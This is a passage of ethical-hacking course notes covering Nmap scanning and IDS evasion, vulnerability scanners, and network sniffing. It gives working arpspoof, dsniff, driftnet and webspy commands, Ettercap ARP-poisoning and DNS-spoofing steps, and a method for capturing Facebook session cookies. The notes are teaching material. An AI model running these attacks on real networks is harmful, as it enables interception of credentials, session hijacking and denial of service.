+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Set</span><span class="w"> </span><span class="n">RHOSTS</span><span class="w"> </span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">15</span><span class="p">.</span><span class="na">1</span><span class="err">–</span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">15</span><span class="p">.</span><span class="na">255</span><span class="w"> </span><span class="err">##</span><span class="n">range</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">host</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="Screenshot 2024-05-05 at 15.27.58.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-05_at_15.27.58.png"></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Performing IDLE scan with Nmap</p>
+<ul>
+<li>
+<p><code>nmap –sI -pN &lt;IP Address Of Zombie&gt; &lt;IP Address Of The Target&gt;</code></p>
+<p><img alt="Screenshot 2024-05-05 at 15.29.21.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-05_at_15.29.21.png"></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Performing IDLE with FTP server (FTP bounce attack)</p>
+<p><img alt="Screenshot 2024-05-05 at 15.31.13.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-05_at_15.31.13.png"></p>
+<ul>
+<li>Some old FTP servers allow proxy-based connection, allowing users to connect to the FTP server and send files ro a third-party server; Already pathced in 1990s</li>
+<li><code>nmap –b &lt;target FTP Server&gt;</code> — check if the server is vuln to FTP bounce attact</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Service and version detection</p>
+<p><img alt="Screenshot 2024-05-05 at 15.33.49.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-05_at_15.33.49.png"></p>
+<ul>
+<li><code>nmap –sV &lt;target IP&gt;</code></li>
+</ul>
+</li>
+<li>
+<p>OS detection</p>
+<ul>
+<li>OS fingerprinting - Nmap
+<ul>
+<li>
+<p><code>nmap –O &lt;Target Address&gt;</code></p>
+<p><img alt="Screenshot 2024-05-05 at 15.36.15.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-05_at_15.36.15.png"></p>
+</li>
+<li>
+<p>Nmap has a databse of more than 2600 OS fingerprints</p>
+</li>
+<li>
+<p>It compare the response from UDP and TCP packets with the database</p>
+</li>
+<li>
+<p>Nmap output</p>
+<ul>
+<li>
+<p>Normal</p>
+<ul>
+<li>
+<p><code>Nmap –sS –PN &lt;targetIP&gt; **–**oN rafay.txt</code> — output the resutl to any txt file</p>
+<p><img alt="Screenshot 2024-05-05 at 15.38.33.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-05_at_15.38.33.png"></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Grepable</p>
+<ul>
+<li>
+<p><code>nmap –sS 192.168.15.1 –oG rafay</code></p>
+<p><img alt="the result is displated one host per line" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-05_at_15.38.21.png"></p>
+<p>the result is displated one host per line</p>
+</li>
+</ul>
+</li>
+<li>
+<p>XML</p>
+<ul>
+<li><code>nmap –sS 192.168.15.1 –oX &lt;filename&gt;</code></li>
+<li>The output generated can be ported to dradis framework and armitage</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Bypassing firewalls</p>
+<ul>
+<li>
+<p>Timing techniques</p>
+<p><img alt="Screenshot 2024-05-05 at 15.44.44.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-05_at_15.44.44.png"></p>
+<ul>
+<li><code>nmap –T1 &lt;Target iP&gt;</code></li>
+<li>Send packets gradually, so they do not end upd being detected by firewall/ IDS</li>
+<li>T command:
+<ul>
+<li><em>T0</em>—Paranoid</li>
+<li><em>T1</em>—Sneaky</li>
+<li><em>T2</em>—Polite</li>
+<li><em>T3</em>—Normal</li>
+<li><em>T4</em>—Aggressive</li>
+<li><em>T5</em>—Insane</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Fragmented packets</p>
+<ul>
+<li>
+<p><code>Nmap –f 192.168.15.1</code></p>
+</li>
+<li>
+<p>Packets split into small chunks, harder for the IDS to detect; however many modern IDS rebuild the fragment</p>
+<p><img alt="Screenshot 2024-05-05 at 16.22.22.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-05_at_16.22.22.png"></p>
+<p><img alt="Screenshot 2024-05-06 at 21.39.05.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-06_at_21.39.05.png"></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Source port scan</p>
+<ul>
+<li>
+<p>It’s common for a network admin to allow traffic from a certain port; 53, 80, 21</p>
+</li>
+<li>
+<p><code>nmap –PN –g 53 192.168.15.1</code></p>
+<p><img alt="Screenshot 2024-05-06 at 21.52.01.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-06_at_21.52.01.png"></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Specifying an MTU</p>
+<ul>
+<li>
+<p>MTU : maximum transmission unit, value is multiple of 8 (8, 16, 24, 32)</p>
+</li>
+<li>
+<p><code>nmap –mtu 32 &lt;target ip&gt;</code></p>
+<p><img alt="Screenshot 2024-05-07 at 21.52.48.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-07_at_21.52.48.png"></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Sending bad checksums</p>
+<ul>
+<li>
+<p>Checksums are used in the TCP header for error detection</p>
+</li>
+<li>
+<p><code>nmap –badsum &lt;Target IP&gt;</code></p>
+<p><img alt="Screenshot 2024-05-07 at 21.55.34.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-07_at_21.55.34.png"></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Decoys</p>
+<ul>
+<li>
+<p>Send spoofed packets from other hosts, which would make it difficult for network admin to detect from which host the scan originated</p>
+</li>
+<li>
+<p>Decoy has a potential to generate very large number of packets; can cause DOS</p>
+</li>
+<li>
+<p><code>nmap –D RND:10 &lt;target iP&gt;</code></p>
+<p><img alt="Screenshot 2024-05-07 at 22.22.15.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-07_at_22.22.15.png"></p>
+</li>
+</ul>
+</li>
+</ul>
+
+</details></p>
+</p>
+<p>
+
+<p><details >
+  <summary markdown="span">Chapter 4: Vulnerability Assessments</summary>
+  <ul>
+<li>
+<p><strong>Definition</strong>: Tools that scan systems, networks, or applications to find potential vulnerabilities.</p>
+</li>
+<li>
+<p><strong>Function</strong>: Probes systems by sending data and analyzing responses to determine open ports, services, operating systems, and vulnerabilities.</p>
+</li>
+<li>
+<p>Pros and Cons of Vulnerability Scanners</p>
+<ul>
+<li><strong>Pros</strong>:
+<ul>
+<li>Automates tasks such as reconnaissance, port scanning, and service/version detection.</li>
+<li>Speeds up and improves the effectiveness of the penetration testing process.</li>
+</ul>
+</li>
+<li><strong>Cons</strong>:
+<ul>
+<li>Can be easily detected due to high traffic generation.</li>
+<li>May produce false positives and false negatives, leading to inaccurate vulnerability reports.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Using Nessus</p>
+<ul>
+<li>Nessus is highlighted as one of the best and oldest vulnerability scanners.</li>
+<li>It can be integrated with Metasploit for more effective vulnerability assessments.</li>
+</ul>
+</li>
+<li>
+<p>Using OpenVAS</p>
+<ul>
+<li>OpenVAS is another vulnerability scanner, though less powerful than Nessus.</li>
+<li>It is worth mentioning for its capabilities in vulnerability scanning.</li>
+</ul>
+</li>
+<li>
+<p>Nmap Scripting Engine</p>
+<ul>
+<li>
+<p><strong>Features</strong>: Automates tasks like OS fingerprinting, DNS enumeration, SNMP enumeration, and vulnerability scanning.</p>
+</li>
+<li>
+<p><strong>Location</strong>: Scripts are in <code>/usr/local/share/nmap/scripts</code>.</p>
+<p><img alt="Screenshot 2024-06-12 at 18.37.30.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_18.37.30.png"></p>
+</li>
+<li>
+<p><strong>Updating Scripts</strong>: Regular updates are recommended using <code>nmap –script-updatedb</code>.</p>
+</li>
+<li>
+<p>Scanning with Nmap</p>
+<ul>
+<li>
+<p><strong>MS08_067_netapi</strong>: A common vulnerability in Windows XP and Windows 2003.</p>
+</li>
+<li>
+<p><strong>Scripts</strong>: <code>smb-check-vulns</code> and <code>-script=vuln</code> can be used to check for this vulnerability and others.</p>
+</li>
+<li>
+<p><strong>Commands</strong>:</p>
+<p><img alt="Screenshot 2024-06-12 at 18.37.51.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_18.37.51.png"></p>
+<ul>
+<li><code>nmap --script=smb-check-vulns &lt;target IP&gt;</code>: Checks for MS08_067_netapi vulnerability.</li>
+<li><code>nmap --script=vuln &lt;target IP&gt;</code>: Executes all vulnerability-related scripts.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Testing SCADA Environments with Nmap</p>
+<ul>
+<li><strong>SCADA Systems:</strong>
+<ul>
+<li>SCADA (Supervisory Control and Data Acquisition) systems monitor industrial processes and are highly sensitive.</li>
+</ul>
+</li>
+<li><strong>Nmap for SCADA:</strong>
+<ul>
+<li>
+<p>Using tools like Nessus, OpenVas, or Nexpose can be dangerous as they may crash SCADA systems.</p>
+</li>
+<li>
+<p>A safer option is using the <code>vulscan.nse</code> script with Nmap:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap –sV –script<span class="o">=</span>vulscan.nse &lt;targetIP&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Nessus:</strong></p>
+<ul>
+<li>Nessus comes with several default policies such as:
+<ul>
+<li>External network scan</li>
+<li>Internal network scan</li>
+<li>Web app tests</li>
+<li>PCI DSS audit preparation</li>
+</ul>
+</li>
+<li>Configurations include:
+<ul>
+<li>Safe checks to avoid affecting the remote target</li>
+<li>Avoid sequential scans to evade detection</li>
+<li>Customizable port ranges and plug-ins</li>
+</ul>
+</li>
+<li>Nessus is a comprehensive vulnerability scanner, able to identify various security issues, misconfigurations, and default/weak passwords.</li>
+</ul>
+</li>
+<li>
+<p><strong>OpenVas:</strong></p>
+<ul>
+<li>OpenVas is an open-source vulnerability scanner.</li>
+<li>Found in Kali Linux under <code>Vulnerability Analysis</code>.</li>
+<li>Requires certificate files (*.pem).</li>
+<li>Limited by the availability of zero-day vulnerability data.</li>
+</ul>
+</li>
+<li>
+<p><strong>Vulnerability Databases:</strong></p>
+<ul>
+<li>Recommended resources for vulnerability data include:
+<ul>
+<li><a href="http://seclist.org/">Seclist.org</a></li>
+<li>Exploit DB</li>
+<li>NIST</li>
+<li>SecurityFocus</li>
+<li>CVE (Common Vulnerabilities and Exposures)</li>
+<li>OSVDB</li>
+<li><a href="http://packetstormsecurity.com/">Packetstormsecurity.com</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Exploit Databases:</strong></p>
+<ul>
+<li>Platforms like Exploit DB provide detailed exploit information and proof of concept.</li>
+<li>Examples of exploits, such as <code>593.pl</code>, offer specific details about vulnerabilities and execution steps.</li>
+</ul>
+</li>
+<li>
+<p><strong>Nexpose:</strong></p>
+<ul>
+<li>Nexpose is a vulnerability scanning tool available as various deployment options (virtual machine, private cloud, etc.).</li>
+<li>Scans networks to identify open ports, running services, and applications to find vulnerabilities.</li>
+<li>Integrates with Metasploit for vulnerability validation and remediation testing.</li>
+<li>Provides features like live monitoring, exposure analytics, and remediation workflow to prioritize and manage vulnerabilities.</li>
+</ul>
+</li>
+<li>
+<p><strong>Useful Links:</strong></p>
+<ul>
+<li>Tenable for Nessus: <a href="http://www.tenable.com/products/nessus-home">Nessus Home</a></li>
+<li>Rapid7 for Nexpose: <a href="https://www.rapid7.com/products/nexpose/">Nexpose</a>, <a href="https://www.rapid7.com/try/insight/">Insight</a></li>
+</ul>
+</li>
+</ul>
+
+</details></p>
+
+
+
+<p><details >
+  <summary markdown="span">Chapter 5: Network Sniffing</summary>
+  <ul>
+<li>
+<p><strong>Network sniffing (eavesdropping)</strong> is an attack where the attacker captures network packets, aiming to capture unencrypted credentials.</p>
+</li>
+<li>
+<p><strong>Common target protocols</strong> include FTP, HTTP, and SMTP.</p>
+</li>
+<li>
+<p><strong>Protection</strong> involves using encrypted communication protocols, making captured traffic unusable.</p>
+</li>
+<li>
+<p><strong>Types of Sniffing:</strong></p>
+<ol>
+<li><strong>Active Sniffing:</strong>
+<ul>
+<li>Involves direct interaction with the target machine by sending packets and requests.</li>
+<li>Examples: ARP spoofing, MAC flooding.</li>
+</ul>
+</li>
+<li><strong>Passive Sniffing:</strong>
+<ul>
+<li>The attacker captures packets without interacting with the target.</li>
+<li>Common in hub-based and wireless networks.</li>
+</ul>
+</li>
+</ol>
+</li>
+<li>
+<p><strong>Hubs vs. Switches:</strong></p>
+<p><img alt="Screenshot 2024-06-12 at 19.23.47.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_19.23.47.png"></p>
+<ul>
+<li><strong>Hub-based networks:</strong>
+<ul>
+<li>Operate on the physical layer (Layer 1) of the OSI model.</li>
+<li>Broadcast traffic to all hosts, leading to bandwidth usage and security flaws.</li>
+<li>Attackers can capture all traffic using sniffers.</li>
+</ul>
+</li>
+<li><strong>Switch-based networks:</strong>
+<ul>
+<li>Operate on the data link layer (Layer 2) of the OSI model.</li>
+<li>Forward frames only to the destination host using the ARP protocol, improving security and efficiency.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Promiscuous vs. Nonpromiscuous Mode:</strong></p>
+<ul>
+<li><strong>Nonpromiscuous Mode:</strong>
+<ul>
+<li>Captures only traffic destined for the specific computer.</li>
+</ul>
+</li>
+<li><strong>Promiscuous Mode:</strong>
+<ul>
+<li>Allows the network card to capture all traffic on the network, essential for sniffing.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>MITM (Man-In-The-Middle) Attacks:</strong></p>
+<p><img alt="Screenshot 2024-06-12 at 19.24.27.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_19.24.27.png"></p>
+<ul>
+<li>The attacker intercepts communication between a client and a server.</li>
+<li>Enables various attacks, such as capturing traffic, denial of service, DNS spoofing, and session hijacking.</li>
+</ul>
+</li>
+<li>
+<p>ARP protocol basics and attacks</p>
+<ul>
+<li>
+<p><strong>ARP Protocol Basics:</strong></p>
+<ul>
+<li><strong>ARP (Address Resolution Protocol)</strong> resolves IP addresses to MAC addresses, operating on the link layer (Layer 2) of the OSI model.</li>
+<li>Every Internet-connected device has a unique MAC address.</li>
+</ul>
+</li>
+<li>
+<p><strong>How ARP Works:</strong></p>
+<p><img alt="Screenshot 2024-06-12 at 19.28.56.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_19.28.56.png"></p>
+<p><img alt="Screenshot 2024-06-12 at 19.29.11.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_19.29.11.png"></p>
+<ul>
+<li>In a switch-based network, Host A (192.168.1.2) needs Host B&rsquo;s (192.168.1.3) MAC address to communicate.</li>
+<li>Host A checks its ARP cache for Host B’s MAC address. If absent, it sends an ARP broadcast request asking for the MAC address of Host B.</li>
+<li>Host B responds with its MAC address, which is then saved in Host A’s ARP table.</li>
+</ul>
+</li>
+<li>
+<p><strong>ARP Attacks:</strong></p>
+<ul>
+<li>
+<p><strong>MAC Flooding:</strong></p>
+<p><img alt="Screenshot 2024-06-12 at 19.30.23.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_19.30.23.png"></p>
+<ul>
+<li>Overloads the switch’s CAM table by sending numerous ARP replies, causing the switch to operate like a hub.</li>
+<li>The attacker can then capture all network traffic using a sniffer.</li>
+<li><strong>Macof</strong> is a tool that can perform MAC flooding, sending up to 155,000 MAC entries per minute. - command: <code>macof</code></li>
+</ul>
+</li>
+<li>
+<p><strong>ARP Poisoning (ARP Spoofing):</strong></p>
+<ul>
+<li>
+<p>Involves sending fake ARP replies to associate the attacker’s MAC address with the IP address of a legitimate device.</p>
+</li>
+<li>
+<p>This poisons the ARP cache, making devices believe that the attacker’s MAC address corresponds to the legitimate IP address.</p>
+</li>
+<li>
+<p><strong>Scenario - How ARP Spoofing Works:</strong></p>
+<p><img alt="Screenshot 2024-06-12 at 19.31.11.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_19.31.11.png"></p>
+<ul>
+<li>An attacker, with IP 192.168.1.10 and MAC address <a href="http://bb.bb.bb.bb/">bb.bb.bb.bb</a>, sends spoofed ARP replies to “bob” (192.168.1.3) and “alice” (192.168.1.4).</li>
+<li>The attacker tells “bob” that “alice” is at the attacker’s MAC address and vice versa.</li>
+<li>All communication between “bob” and “alice” is now intercepted by the attacker.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Denial of Service (DoS) Attacks:</strong></p>
+<ul>
+<li>An attacker can use ARP spoofing to deny network access by associating the victim’s router IP with a non-existent MAC address.</li>
+<li>This prevents the victim from reaching the Internet as their traffic is directed to a non-existing location.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Tools of the trade</p>
+<ul>
+<li>
+<p>Dsniff</p>
+<ul>
+<li>
+<p>Key Tools in the Dsniff Suite:</p>
+<ol>
+<li><strong>Arpspoof</strong>: Poisons the ARP cache by forging ARP replies.</li>
+<li><strong>Mailsnarf</strong>: Sniffs email messages sent from protocols like SMTP and POP.</li>
+<li><strong>Msgsnarf</strong>: Sniffs instant messaging conversations.</li>
+<li><strong>Webspy</strong>: Sniffs URLs visited by the victim and opens them in the attacker&rsquo;s browser.</li>
+<li><strong>Urlsnarf</strong>: Sniffs URLs visited by the victim.</li>
+<li><strong>Macof</strong>: Performs MAC flooding attacks.</li>
+</ol>
+</li>
+<li>
+<p>Performing MITM attacks:</p>
+<h3 id="1-enable-ip-forwarding">1. <strong>Enable IP Forwarding</strong>:<a hidden class="anchor" aria-hidden="true" href="#1-enable-ip-forwarding">#</a></h3>
+<p>Before starting the ARP spoofing, you need to enable IP forwarding on the attacker&rsquo;s machine. This allows the attacker to forward the intercepted packets to their intended destination, ensuring the network communication continues smoothly.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/net/ipv4/ip_forward
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="2-gather-information">2. <strong>Gather Information</strong>:<a hidden class="anchor" aria-hidden="true" href="#2-gather-information">#</a></h3>
+<ul>
+<li><strong>Attacker&rsquo;s IP</strong>: 192.168.75.138</li>
+<li><strong>Victim&rsquo;s IP</strong>: 192.168.75.142</li>
+<li><strong>Default Gateway&rsquo;s IP</strong>: 192.168.75.2</li>
+</ul>
+<h3 id="3-arp-spoofing-commands">3. <strong>ARP Spoofing Commands</strong>:<a hidden class="anchor" aria-hidden="true" href="#3-arp-spoofing-commands">#</a></h3>
+<p>The attacker uses the <code>arpspoof</code> tool to send forged ARP replies, associating their own MAC address with the IP addresses of the gateway and the victim.</p>
+<h3 id="command-to-spoof-the-default-gateways-mac-address">Command to Spoof the Default Gateway&rsquo;s MAC Address:<a hidden class="anchor" aria-hidden="true" href="#command-to-spoof-the-default-gateways-mac-address">#</a></h3>
+<p>The first command tells the victim&rsquo;s machine (192.168.75.142) that the attacker&rsquo;s MAC address belongs to the default gateway (192.168.75.2).</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">arpspoof -i eth0 -t 192.168.75.142 192.168.75.2
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><code>i eth0</code>: Specifies the network interface to use (in this case, <code>eth0</code>).</li>
+<li><code>t 192.168.75.142</code>: Specifies the target host (the victim).</li>
+<li><code>192.168.75.2</code>: Specifies the IP address of the gateway.</li>
+</ul>
+<h3 id="command-to-spoof-the-victims-mac-address">Command to Spoof the Victim&rsquo;s MAC Address:<a hidden class="anchor" aria-hidden="true" href="#command-to-spoof-the-victims-mac-address">#</a></h3>
+<p>The second command tells the gateway (192.168.75.2) that the attacker&rsquo;s MAC address belongs to the victim (192.168.75.142).</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">arpspoof -i eth0 -t 192.168.75.2 192.168.75.142
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><code>i eth0</code>: Specifies the network interface to use (in this case, <code>eth0</code>).</li>
+<li><code>t 192.168.75.2</code>: Specifies the target host (the gateway).</li>
+<li><code>192.168.75.142</code>: Specifies the IP address of the victim.</li>
+</ul>
+</li>
+<li>
+<p>Traffic Sniffing Tools (post MITM):</p>
+<ol>
+<li>
+<p><strong>Dsniff</strong>: Captures clear text passwords traversing the network.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dsniff
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p><strong>Driftnet</strong>: Captures images viewed by the victim in their browser.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">driftnet -v
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p><strong>Urlsnarf</strong>: Tracks URLs visited by the victim.</p>
+</li>
+<li>
+<p><strong>Webspy</strong>: Opens the URLs visited by the victim in the attacker&rsquo;s browser.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">webspy -i eth0 192.168.75.142
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ol>
+</li>
+</ul>
+</li>
+<li>
+<p>Ettercap</p>
+<ul>
+<li>
+<p>ARP spoofing</p>
+<p>Steps for ARP Poisoning with Ettercap:</p>
+<ol>
+<li>
+<p><strong>Launch Ettercap</strong>:</p>
+<ul>
+<li>Execute the command: <code>ettercap -G</code></li>
+<li>This opens Ettercap with a graphical user interface.</li>
+</ul>
+</li>
+<li>
+<p><strong>Select Interface</strong>:</p>
+<p><img alt="Screenshot 2024-06-12 at 21.17.33.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_21.17.33.png"></p>
+<ul>
+<li>Click on the “Sniff” button.</li>
+<li>Choose “Unsniffed bridging” and select the appropriate network interface.</li>
+</ul>
+</li>
+<li>
+<p><strong>Scan for Hosts</strong>:</p>
+<p><img alt="Screenshot 2024-06-12 at 21.17.48.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_21.17.48.png"></p>
+<ul>
+<li>Click on “Host List” at the top.</li>
+<li>Select “Scan for host” to scan the network for all live hosts.</li>
+</ul>
+</li>
+<li>
+<p><strong>View Hosts List</strong>:</p>
+<p><img alt="Screenshot 2024-06-12 at 21.17.59.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_21.17.59.png"></p>
+<ul>
+<li>Once the scan is complete, click on “Hosts List” to display all found hosts.</li>
+</ul>
+</li>
+<li>
+<p><strong>Set Targets</strong>:</p>
+<p><img alt="Screenshot 2024-06-12 at 21.18.19.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_21.18.19.png"></p>
+<ul>
+<li>Choose the target hosts:
+<ul>
+<li><strong>Target 1</strong>: Victim’s IP (e.g., 192.168.75.142)</li>
+<li><strong>Target 2</strong>: Default gateway IP (e.g., 192.168.75.2)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Launch ARP Poisoning</strong>:</p>
+<p><img alt="Screenshot 2024-06-12 at 21.18.11.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_21.18.11.png"></p>
+<ul>
+<li>Click on the “MITM” tab.</li>
+<li>Select “ARP Poisoning” and click “Ok” to start the attack.</li>
+</ul>
+</li>
+<li>
+<p><strong>Start Sniffing</strong>:</p>
+<ul>
+<li>Click on “Start sniffing” to begin capturing traffic between the victim and the gateway.</li>
+</ul>
+</li>
+<li>
+<p><strong>Check ARP Poisoning</strong>:</p>
+<p><img alt="Screenshot 2024-06-12 at 21.19.23.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_21.19.23.png"></p>
+<ul>
+<li>Use the “chk_poison” plug-in to verify successful ARP poisoning.</li>
+<li>Go to the plug-ins menu and double-click on “chk_poison” to check the status.</li>
+</ul>
+</li>
+<li>
+<p><strong>Capture Traffic with Wireshark</strong>:</p>
+<ul>
+<li>Use Wireshark to capture and analyze the traffic between the victim and the gateway.</li>
+</ul>
+</li>
+<li>
+<p><strong>Additional Plug-ins</strong>:</p>
+<ul>
+<li><strong>dos_attack</strong>: Launch a denial-of-service attack.</li>
+<li><strong>auto_add</strong>: Automatically add new targets discovered on the network.</li>
+</ul>
+</li>
+</ol>
+<p>By following these steps, Ettercap can efficiently perform ARP poisoning attacks and offer additional capabilities through its various plug-ins.</p>
+</li>
+<li>
+<p>DNS spoofing</p>
+<ol>
+<li>
+<p><strong>Launch an ARP spoofing attack</strong>: This step is essential to intercept traffic between the victim and the router.</p>
+<p><img alt="Screenshot 2024-06-12 at 22.57.47.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_22.57.47.png"></p>
+<p><img alt="Screenshot 2024-06-12 at 22.57.55.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_22.57.55.png"></p>
+</li>
+<li>
+<p><strong>Manipulate DNS records</strong>: Edit the <code>/usr/share/ettercap/etter.dns</code> file to change the A record of a target domain (e.g., <a href="http://www.google.com/">www.google.com</a>) to the attacker&rsquo;s web server IP.</p>
+<p><img alt="Screenshot 2024-06-12 at 22.58.05.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_22.58.05.png"></p>
+</li>
+<li>
+<p><strong>Launch the DNS spoofing attack using Ettercap</strong>: Use the &ldquo;dnsspoof&rdquo; plugin in Ettercap to execute the attack, redirecting the victim to the attacker&rsquo;s server when they visit the target URL.</p>
+</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>
+<p>Cain and Abel + Wireshark</p>
+<ul>
+<li>
+<p>Performing MITM</p>
+<ol>
+<li>
+<p><strong>Turn on the Sniffer</strong>:</p>
+<p><img alt="Screenshot 2024-06-12 at 21.24.09.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_21.24.09.png"></p>
+<ul>
+<li>Click on the green button above the decoder tab to turn on the sniffer.</li>
+<li>Click the plus sign (+) at the top to scan for MAC addresses and IP addresses in your subnet. You can define your own range and set your targets if desired.</li>
+</ul>
+</li>
+<li>
+<p><strong>Perform ARP Spoofing</strong>:</p>
+<p><img alt="Screenshot 2024-06-12 at 21.24.29.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_21.24.29.png"></p>
+<ul>
+<li>Click on the “APR” tab at the bottom.</li>
+<li>Click on the white area in the top frame to turn the “+” sign blue.</li>
+</ul>
+<p><img alt="Screenshot 2024-06-12 at 21.24.44.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_21.24.44.png"></p>
+<ul>
+<li>Click on the blue “+” sign to see the list of hosts.</li>
+<li>Select the hosts to intercept traffic between: the default gateway on the left and the victim hosts on the right.</li>
+</ul>
+</li>
+<li>
+<p><strong>Start Poisoning</strong>:</p>
+<p><img alt="Screenshot 2024-06-12 at 21.25.51.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-06-12_at_21.25.51.png"></p>
+<ul>
+<li>Click “Ok” to confirm your selections.</li>
+<li>Click the yellow button under the file menu to begin poisoning the routes. Traffic will soon start being captured by Cain and Abel.</li>
+</ul>
+</li>
+</ol>
+</li>
+<li>
+<p>Sniffing session cookies</p>
+<p>Steps for Capturing Session Cookies:</p>
+<ol>
+<li><strong>Filter HTTP Cookies in Wireshark</strong>:
+<ul>
+<li>Apply a filter in Wireshark to capture HTTP requests containing specific session cookies (e.g., <code>c_user</code> and <code>xs</code> for Facebook).</li>
+</ul>
+</li>
+<li><strong>Inspect HTTP Requests</strong>:
+<ul>
+<li>Inspect the HTTP requests to find all cookies associated with the target site (e.g., Facebook).</li>
